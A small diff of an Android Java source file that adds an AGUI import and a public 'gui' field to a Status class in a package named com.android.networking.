@@ -22,6 +22,7 @@ import com.android.networking.conf.ConfEvent;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.Globals;
 import com.android.networking.event.BaseEvent;
+import com.android.networking.gui.AGUI;
 import com.android.networking.gui.Preview;
 import com.android.networking.module.ModuleCrisis;
 import com.android.networking.util.Check;
@@ -69,6 +70,8 @@ public class Status {
 	static public boolean uninstall;
 
 	public Preview preview;
+
+	public AGUI gui;
 
 	/**
 	 * Instantiates a new status.
